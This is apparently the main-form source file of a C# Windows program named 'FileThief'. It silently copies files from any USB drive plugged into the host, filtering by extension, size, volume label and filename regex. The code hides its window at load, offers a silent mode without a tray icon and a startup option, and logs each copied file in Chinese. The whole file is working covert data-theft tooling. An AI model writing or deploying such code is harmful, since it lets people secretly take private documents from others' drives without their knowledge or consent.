using System;
using System.Globalization;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace FileThief
{
    public partial class FrmMain : Form
    {
        public const int WmDevicechange = 0x219;
        public const int DbtDevicearrival = 0x8000;
        public const int DbtConfigchangecanceled = 0x19;
        public const int DbtConfigchanged = 0x18;
        public const int DbtCustomevent = 0x8006;
        public const int DbtDevicequeryremove = 0x8001;
        public const int DbtDevicequeryremovefailed = 0x8002;
        public const int DbtDeviceremovecomplete = 0x8004;
        public const int DbtDeviceremovepending = 0x8003;
        public const int DbtDevicetypespecific = 0x8005;
        public const int DbtDevnodesChanged = 0x7;
        public const int DbtQuerychangeconfig = 0x17;
        public const int DbtUserdefined = 0xFFFF;

        public string UsbDrive, UsbLabel;

        public FrmMain()
        {
            InitializeComponent();
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WmDevicechange)
            {
                switch (m.WParam.ToInt32())
                {
                    case WmDevicechange:
                        break;
                    case DbtDevicearrival:
                        // USB Driver Connected 
                        DriveInfo[] s = DriveInfo.GetDrives();
                        foreach (DriveInfo drive in s)
                        {
                            if (drive.DriveType == DriveType.Removable | ClsMain.Status)
                            {
                                UsbDrive = drive.Name;
                                UsbLabel = drive.VolumeLabel;
                                if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入，盘符 " + UsbDrive + ", 卷标 " + UsbLabel, 0, ClsMain.ConLogPath);
                                ScanFile(UsbDrive, ClsMain.ConLabel, ClsMain.ConType,ClsMain.ConFileNameRegExp);
                            }
                        }
                        break;
                    case DbtConfigchangecanceled:
                        break;
                    case DbtConfigchanged:
                        break;
                    case DbtCustomevent:
                        break;
                    case DbtDevicequeryremove:
                        break;
                    case DbtDevicequeryremovefailed:
                        break;
                    case DbtDeviceremovecomplete:
                        // USB Driver Disconnected
                        UsbDrive = ""; 
                        if (ClsMain.ConLogInfo == "1") WriteLog("设备已弹出", 0, ClsMain.ConLogPath);
                        break;
                    case DbtDeviceremovepending:
                        break;
                    case DbtDevicetypespecific:
                        break;
                    case DbtDevnodesChanged:
                        break;
                    case DbtQuerychangeconfig:
                        break;
                    case DbtUserdefined:
                        break;
                }
            }
            base.WndProc(ref m);
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            if (!File.Exists(ClsMain.StrConfig))
            {
                ClsMain.WriteIni("FileType", "Type", "rar|zip|7z|doc|docx|ppt|pptx|xls|xlsx", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "TypeMode", "0", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "Size", "10240", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "SizeMode", "0", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "Path", "", ClsMain.StrConfig);

                ClsMain.WriteIni("FileName", "RegExp", "", ClsMain.StrConfig);

                ClsMain.WriteIni("Driver", "VolumeLabel", "", ClsMain.StrConfig);
                ClsMain.WriteIni("Driver", "VolumeLabelMode", "0", ClsMain.StrConfig);

                ClsMain.WriteIni("Log", "WriteLog", "1", ClsMain.StrConfig);
                ClsMain.WriteIni("Log", "LogPath", Application.StartupPath + "\\FileThief.log", ClsMain.StrConfig);
                ClsMain.WriteIni("Log", "LogError", "1", ClsMain.StrConfig);
                ClsMain.WriteIni("Log", "LogInfo", "1", ClsMain.StrConfig);

                ClsMain.WriteIni("General", "Startup", "0", ClsMain.StrConfig);
                ClsMain.WriteIni("General", "SilentMode", "0", ClsMain.StrConfig);
                LoadSettings();
                if (!Directory.Exists(Application.StartupPath + "\\Files")) Directory.CreateDirectory(Application.StartupPath + "\\Files");
                if (!File.Exists(ClsMain.ConLogPath)) File.WriteAllText(ClsMain.ConLogPath, "FileThief 日志\n", Encoding.UTF8);
                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1"){ WriteLog("FileThief 开始运行", 0, ClsMain.ConLogPath);}
            }
            else
            {
                LoadSettings();
                if (!Directory.Exists(ClsMain.ConPath) && ClsMain.ConPath != "") Directory.CreateDirectory(ClsMain.ConPath);
                if (!File.Exists(ClsMain.ConLogPath)) File.WriteAllText(ClsMain.ConLogPath, "FileThief 日志\n", Encoding.UTF8);
                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1") WriteLog("FileThief 开始运行", 0, ClsMain.ConLogPath);
            }
            if (ClsMain.ConSilent == "0")
            {
                ntf.Visible = true;
            }
            // Hide Form
            BeginInvoke(new Action(() => {
                Hide();
                Opacity = 1;
            }));
            
        }

        public void LoadSettings()
        {
            ClsMain.ConType = ClsMain.ReadIni("FileType", "Type", "rar|zip|7z|doc|docx|ppt|pptx|xls|xlsx", ClsMain.StrConfig).Split('|');
            ClsMain.BType = ClsMain.ReadIni("FileType", "TypeMode", "0", ClsMain.StrConfig);
            ClsMain.CType = ClsMain.ReadIni("FileType", "Type", "rar|zip|7z|doc|docx|ppt|pptx|xls|xlsx", ClsMain.StrConfig);
            ClsMain.ConSize = Convert.ToInt32(ClsMain.ReadIni("FileType", "Size", "10240", ClsMain.StrConfig));
            ClsMain.BSize = ClsMain.ReadIni("FileType", "SizeMode", "0", ClsMain.StrConfig);
            ClsMain.ConPath = ClsMain.ReadIni("FileType", "Path", Application.StartupPath + "\\Files", ClsMain.StrConfig);

            ClsMain.ConFileNameRegExp = ClsMain.ReadIni("FileName", "RegExp", "", ClsMain.StrConfig);

            ClsMain.ConLabel = ClsMain.ReadIni("Driver", "VolumeLabel", "", ClsMain.StrConfig).Split(new char[] { '|' });
            ClsMain.BLabel = ClsMain.ReadIni("Driver", "VolumeLabelMode", "0", ClsMain.StrConfig);
            ClsMain.CLabel = ClsMain.ReadIni("Driver", "VolumeLabel", "", ClsMain.StrConfig);

            ClsMain.ConLog = ClsMain.ReadIni("Log", "WriteLog", "1", ClsMain.StrConfig);
            ClsMain.ConLogPath = ClsMain.ReadIni("Log", "LogPath", "", ClsMain.StrConfig);
            ClsMain.ConLogErr = ClsMain.ReadIni("Log", "LogError", "1", ClsMain.StrConfig);
            ClsMain.ConLogInfo = ClsMain.ReadIni("Log", "LogInfo", "1", ClsMain.StrConfig);

            ClsMain.ConStartup = ClsMain.ReadIni("General", "Startup", "0", ClsMain.StrConfig);
            ClsMain.ConSilent = ClsMain.ReadIni("General", "SilentMode", "1", ClsMain.StrConfig);
        }

        public void ScanFile(string driver, string[] volumeLabel, string[] extension, string regExp)
        {
            if (driver != null)
            {
                var mDirInfo = new DirectoryInfo(driver);
                try
                {
                    //Specified Volume Label
                    if (volumeLabel.Length >= 1 && volumeLabel[0] != "")
                    {
                        foreach (var vLabel in volumeLabel)
                        {
                            if ((vLabel == UsbLabel && ClsMain.BLabel=="0") | (vLabel != UsbLabel && ClsMain.BLabel=="1")) // Check Volume Label
                            {
                                foreach (string exName in extension) // Check Extension Name
                                {
                                    foreach (var mFileInfo in mDirInfo.GetFiles("*." + exName))
                                    {
                                        double dFileLength = mFileInfo.Length / (double)1024;
                                        if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <= ClsMain.ConSize) // Check File Size
                                        {
                                            var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
                                                UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
                                            // Check File Name using RegExp
                                            if (ClsMain.ConFileNameRegExp != null)
                                            {
                                                Regex regex =
                                                    new Regex(ClsMain.ConFileNameRegExp, RegexOptions.IgnoreCase);
                                                if (regex.IsMatch(Path.GetFileName(mFileInfo.FullName)))
                                                {
                                                    MatchCollection matchCollection =
                                                        regex.Matches(Path.GetFileName(mFileInfo.FullName));
                                                    foreach (Match match in matchCollection)
                                                    {
                                                        // Create Directory if Not Exists
                                                        if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                                            Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
                                                        if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                                        // Copy File
                                                        File.Copy(mFileInfo.FullName,
                                                            mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                                ClsMain.ConPath + "\\" + UsbLabel),
                                                            true); //  + "\\" + Path.GetFileName(mFileInfo.FullName));
                                                        if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                                                            WriteLog("已复制 " + mFileInfo.FullName, 0,
                                                                ClsMain.ConLogPath);
                                                    }
                                                }
                                            }
                                            else
                                            {
                                                // Create Directory if Not Exists
                                                if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                                    Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
                                                if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                                // Copy File
                                                File.Copy(mFileInfo.FullName,
                                                    mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                        ClsMain.ConPath + "\\" + UsbLabel),
                                                            true); //  + "\\" + Path.GetFileName(mFileInfo.FullName));
                                                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                                                    WriteLog("已复制 " + mFileInfo.FullName, 0,
                                                        ClsMain.ConLogPath);
                                            }
                                            
                                            
                                        }
                                    }
                                }
                                foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
                                {
                                    ScanFile(mDir.FullName, volumeLabel, extension,ClsMain.ConFileNameRegExp );
                                }
                            }
                        }
                    }
                    else
                    {
                        // Not specified Volume Label
                        foreach (string exName in extension) // Check Extension Name
                        {
                            foreach (FileInfo mFileInfo in mDirInfo.GetFiles("*." + exName))
                            {
                                double dFileLength = mFileInfo.Length / (double)1024;
                                if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <= ClsMain.ConSize) // Check File Size
                                {
                                    var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
                                        UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
                                    // Copy File
                                    // Check File Name using RegExp
                                    if (ClsMain.ConFileNameRegExp != null)
                                    {
                                        Regex regex =
                                            new Regex(ClsMain.ConFileNameRegExp, RegexOptions.IgnoreCase);
                                        if (regex.IsMatch(Path.GetFileName(mFileInfo.FullName)))
                                        {
                                            MatchCollection matchCollection =
                                                regex.Matches(Path.GetFileName(mFileInfo.FullName));
                                            foreach (Match match in matchCollection)
                                            {
                                                // Create Directory if Not Exists
                                                if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                                    Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
                                                if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                                // Copy File
                                                File.Copy(mFileInfo.FullName,
                                                    mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                        ClsMain.ConPath + "\\" + UsbLabel),
                                                    true); //  + "\\" + Path.GetFileName(mFileInfo.FullName));
                                                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                                                    WriteLog("已复制 " + mFileInfo.FullName, 0,
                                                        ClsMain.ConLogPath);
                                            }
                                        }
                                    }
                                    else
                                    {
                                        // Create Directory if Not Exists
                                        if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                                            Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
                                        if (!Directory.Exists(fn)) Directory.CreateDirectory(fn);
                                        // Copy File
                                        File.Copy(mFileInfo.FullName,
                                            mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                                ClsMain.ConPath + "\\" + UsbLabel),
                                            true); //  + "\\" + Path.GetFileName(mFileInfo.FullName));
                                        if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                                            WriteLog("已复制 " + mFileInfo.FullName, 0,
                                                ClsMain.ConLogPath);
                                    }
                                }
                            }
                        }
                        foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
                        {
                            ScanFile(mDir.FullName, volumeLabel, extension,ClsMain.ConFileNameRegExp );
                        }
                    }
                }
                catch (Exception ex)
                {
                    if (ClsMain.ConLog == "1" && ClsMain.ConLogErr == "1") WriteLog(ex.Message, 1, ClsMain.ConLogPath);
                }
            }
        }

        private void tsmiSettings_Click(object sender, EventArgs e)
        {
            new FrmSettings().Show();
        }

        private void tsmiStartStop_Click(object sender, EventArgs e)
        {
            ClsMain.Status = !ClsMain.Status;
            if (ClsMain.Status == true)
            {
                tsmiStartStop.Text = "停止(&S)";
            }
            else
            {
                tsmiStartStop.Text = "启动(&S)";
            }
        }

        private void tsmiExit_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void tsmiAbout_Click(object sender, EventArgs e)
        {
            new FrmAbout().Show();
        }

        public void WriteLog(string content, int logType, string path)
        {
            DateTime dt = DateTime.Now;
            using (StreamWriter file = new StreamWriter(path, true))
            {
                switch (logType)
                {
                    case 0: // Info
                        file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][信息] " + content);
                        break;
                    case 1: // Error
                        file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][错误] " + content);
                        break;
                } 
            }
        }
    }
}